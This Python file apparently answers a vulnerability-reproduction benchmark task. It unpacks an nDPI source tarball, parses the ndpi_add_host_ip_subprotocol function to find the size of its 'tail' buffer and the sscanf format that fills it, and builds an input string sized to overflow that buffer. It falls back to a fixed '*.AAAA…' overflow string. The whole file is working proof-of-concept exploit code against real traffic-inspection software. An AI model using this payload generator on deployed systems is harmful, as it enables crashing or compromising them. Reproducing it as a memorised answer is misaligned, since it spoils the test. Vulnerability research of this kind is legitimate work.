import os
import re
import tarfile
import tempfile


def split_args(arg_str: str):
    args = []
    cur = []
    depth = 0
    in_str = False
    str_quote = ''
    escape = False

    for ch in arg_str:
        if in_str:
            cur.append(ch)
            if escape:
                escape = False
            elif ch == '\\':
                escape = True
            elif ch == str_quote:
                in_str = False
            continue

        if ch in ('"', "'"):
            in_str = True
            str_quote = ch
            cur.append(ch)
            continue

        if ch == '(':
            depth += 1
            cur.append(ch)
            continue
        if ch == ')':
            if depth > 0:
                depth -= 1
            cur.append(ch)
            continue

        if ch == ',' and depth == 0:
            args.append(''.join(cur).strip())
            cur = []
        else:
            cur.append(ch)

    if cur:
        args.append(''.join(cur).strip())

    return args


def find_matching_brace(s: str, open_index: int) -> int:
    depth = 1
    i = open_index + 1
    in_str = False
    str_quote = ''
    escape = False

    while i < len(s):
        ch = s[i]
        if in_str:
            if escape:
                escape = False
            elif ch == '\\':
                escape = True
            elif ch == str_quote:
                in_str = False
            i += 1
            continue

        if ch in ('"', "'"):
            in_str = True
            str_quote = ch
            i += 1
            continue

        if ch == '{':
            depth += 1
        elif ch == '}':
            depth -= 1
            if depth == 0:
                return i
        i += 1

    return -1


def extract_string_literal(expr: str):
    s = expr
    start = s.find('"')
    if start == -1:
        return None
    i = start + 1
    end = -1
    while i < len(s):
        if s[i] == '"' and (i == 0 or s[i - 1] != '\\'):
            end = i
            break
        i += 1
    if end == -1:
        return None
    raw = s[start + 1:end]
    return unescape_c_string(raw)


def unescape_c_string(s: str) -> str:
    result = []
    i = 0
    n = len(s)
    while i < n:
        ch = s[i]
        if ch != '\\':
            result.append(ch)
            i += 1
            continue
        i += 1
        if i >= n:
            break
        esc = s[i]
        i += 1
        if esc == 'n':
            result.append('\n')
        elif esc == 't':
            result.append('\t')
        elif esc == 'r':
            result.append('\r')
        elif esc == 'v':
            result.append('\v')
        elif esc == 'f':
            result.append('\f')
        elif esc == '\\':
            result.append('\\')
        elif esc == '"':
            result.append('"')
        elif esc == "'":
            result.append("'")
        elif esc in '01234567':
            digits = esc
            cnt = 1
            while i < n and cnt < 3 and s[i] in '01234567':
                digits += s[i]
                i += 1
                cnt += 1
            try:
                result.append(chr(int(digits, 8)))
            except ValueError:
                result.append('?')
        elif esc == 'x':
            digits = ''
            while i < n and s[i] in '0123456789abcdefABCDEF':
                digits += s[i]
                i += 1
            if digits:
                try:
                    result.append(chr(int(digits, 16)))
                except ValueError:
                    result.append('?')
            else:
                result.append('x')
        else:
            result.append(esc)
    return ''.join(result)


def parse_scanf_format(fmt: str):
    convs = []
    i = 0
    n = len(fmt)

    while i < n:
        if fmt[i] != '%':
            i += 1
            continue

        if i + 1 < n and fmt[i + 1] == '%':
            i += 2
            continue

        start = i
        j = i + 1
        assign_suppressed = False

        if j < n and fmt[j] == '*':
            assign_suppressed = True
            j += 1

        width = None
        w_start = j
        while j < n and fmt[j].isdigit():
            j += 1
        if j > w_start:
            try:
                width = int(fmt[w_start:j])
            except ValueError:
                width = None

        if j < n and fmt[j] in 'hlLjzt':
            lm1 = fmt[j]
            j += 1
            if j < n and fmt[j] == lm1 and lm1 in 'hlL':
                j += 1

        if j >= n:
            break

        conv_type = fmt[j]
        spec = {
            'type': conv_type,
            'assign_suppressed': assign_suppressed,
            'width': width,
            'start': start,
        }

        if conv_type == '[':
            pattern_start = j + 1
            negative = False
            if pattern_start < n and fmt[pattern_start] == '^':
                negative = True
                pattern_start += 1
            cur = pattern_start
            if cur < n and fmt[cur] == ']':
                cur += 1
            while cur < n and fmt[cur] != ']':
                cur += 1
            pattern_end = cur
            pattern = fmt[pattern_start:pattern_end]
            spec['bracket_negative'] = negative
            spec['bracket_pattern'] = pattern
            j = pattern_end
        spec['end'] = j
        convs.append(spec)
        i = j + 1

    return convs


def translate_literal_segment(seg: str) -> str:
    out = []
    i = 0
    n = len(seg)
    while i < n:
        ch = seg[i]
        if ch.isspace():
            out.append(' ')
            while i < n and seg[i].isspace():
                i += 1
        else:
            out.append(ch)
            i += 1
    return ''.join(out)


def parse_bracket_chars(pattern: str):
    res = set()
    i = 0
    n = len(pattern)
    while i < n:
        if i + 2 < n and pattern[i + 1] == '-' and pattern[i + 2] != ']':
            start = ord(pattern[i])
            end = ord(pattern[i + 2])
            if start <= end:
                for c in range(start, end + 1):
                    res.add(chr(c))
            else:
                for c in range(end, start + 1):
                    res.add(chr(c))
            i += 3
        else:
            res.add(pattern[i])
            i += 1
    return res


def choose_char_for_bracket(spec):
    pattern = spec.get('bracket_pattern', '')
    negative = spec.get('bracket_negative', False)
    universe = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    base_set = parse_bracket_chars(pattern)
    if negative:
        allowed = {c for c in universe if c not in base_set}
    else:
        allowed = {c for c in universe if c in base_set}
    if not allowed:
        return 'A'
    return sorted(allowed)[0]


def build_token_for_conv(spec, is_tail: bool, tail_size: int) -> str:
    conv_type = spec['type']
    width = spec.get('width')
    if is_tail:
        if width is not None and width <= tail_size:
            length = width
        else:
            length = tail_size + 1
    else:
        if conv_type == 'c':
            length = width or 1
        else:
            length = 1

    if length <= 0:
        length = 1

    if conv_type == 's':
        ch = 'A'
        return ch * length
    if conv_type == '[':
        ch = choose_char_for_bracket(spec)
        return ch * length
    if conv_type == 'c':
        return 'Z' * length
    if conv_type in 'dioxXu':
        return '1' * length
    if conv_type in 'eEfFgGaA':
        return '1' * length
    return 'A' * length


def build_input_from_format(fmt: str, tail_conv_idx: int, tail_size: int) -> str:
    convs = parse_scanf_format(fmt)
    if not convs:
        return ""
    result = []
    pos = 0
    assigned_idx = -1
    for spec in convs:
        seg = fmt[pos:spec['start']]
        if seg:
            result.append(translate_literal_segment(seg))
        if not spec['assign_suppressed']:
            assigned_idx += 1
            is_tail = (assigned_idx == tail_conv_idx)
        else:
            is_tail = False
        token = build_token_for_conv(spec, is_tail, tail_size)
        result.append(token)
        pos = spec['end'] + 1

    if pos < len(fmt):
        result.append(translate_literal_segment(fmt[pos:]))
    return ''.join(result)


def find_tail_sscanf_details(func_body: str):
    pos = 0
    while True:
        idx = func_body.find('sscanf', pos)
        if idx == -1:
            break
        pstart = func_body.find('(', idx)
        if pstart == -1:
            break
        depth = 1
        j = pstart + 1
        n = len(func_body)
        while j < n and depth > 0:
            ch = func_body[j]
            if ch == '(':
                depth += 1
            elif ch == ')':
                depth -= 1
            j += 1
        if depth != 0:
            break
        args_end = j - 1
        args_str = func_body[pstart + 1:args_end]
        args = split_args(args_str)
        tail_idx = None
        for i, a in enumerate(args):
            if re.search(r'\btail\b', a):
                tail_idx = i
                break
        if tail_idx is None or len(args) < 2:
            pos = j
            continue
        fmt_str = extract_string_literal(args[1])
        if fmt_str is None:
            pos = j
            continue
        convs = parse_scanf_format(fmt_str)
        convs_with_assign = [c for c in convs if not c['assign_suppressed']]
        conv_idx = tail_idx - 2
        if conv_idx < 0 or conv_idx >= len(convs_with_assign):
            pos = j
            continue
        return fmt_str, conv_idx
        # move forward
    return None, None


def find_file(root: str, target: str):
    for dirpath, _, files in os.walk(root):
        if target in files:
            return os.path.join(dirpath, target)
    return None


def build_host_payload_from_ndpi(ndpi_main_path: str) -> bytes:
    with open(ndpi_main_path, 'r', errors='ignore') as f:
        content = f.read()

    func_pattern = re.compile(
        r'ndpi_add_host_ip_subprotocol\s*\(([^)]*)\)\s*\{',
        re.MULTILINE | re.DOTALL,
    )
    m = func_pattern.search(content)
    if not m:
        tail_size = 64
        payload = "*." + "A" * (tail_size + 1)
        return payload.encode('ascii', 'ignore')

    params_str = m.group(1)
    brace_start = content.find('{', m.start())
    if brace_start == -1:
        tail_size = 64
        payload = "*." + "A" * (tail_size + 1)
        return payload.encode('ascii', 'ignore')

    brace_end = find_matching_brace(content, brace_start)
    if brace_end == -1:
        tail_size = 64
        payload = "*." + "A" * (tail_size + 1)
        return payload.encode('ascii', 'ignore')

    func_body = content[brace_start + 1:brace_end]

    tail_match = re.search(r'char\s+tail\s*\[\s*(\d+)\s*\]', func_body)
    if tail_match:
        try:
            tail_size = int(tail_match.group(1))
        except ValueError:
            tail_size = 64
    else:
        tail_size = 64
    if tail_size <= 0 or tail_size > 4096:
        tail_size = 64

    fmt_str, tail_conv_idx = find_tail_sscanf_details(func_body)

    if fmt_str:
        fmt_strip = fmt_str.lstrip()
        if fmt_strip.startswith('*.'):
            payload_str = "*." + "A" * (tail_size + 1)
        else:
            s = build_input_from_format(fmt_str, tail_conv_idx, tail_size)
            if not s:
                payload_str = "*." + "A" * (tail_size + 1)
            else:
                payload_str = s
    else:
        payload_str = "*." + "A" * (tail_size + 1)

    return payload_str.encode('ascii', 'ignore')


class Solution:
    def solve(self, src_path: str) -> bytes:
        fallback_len = 56
        fallback = b"*." + b"A" * (fallback_len - 2)
        try:
            tmp_dir = tempfile.mkdtemp(prefix="ndpi_poc_")
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmp_dir)

            ndpi_main_path = find_file(tmp_dir, 'ndpi_main.c')
            if not ndpi_main_path:
                return fallback

            return build_host_payload_from_ndpi(ndpi_main_path)
        except Exception:
            return fallback
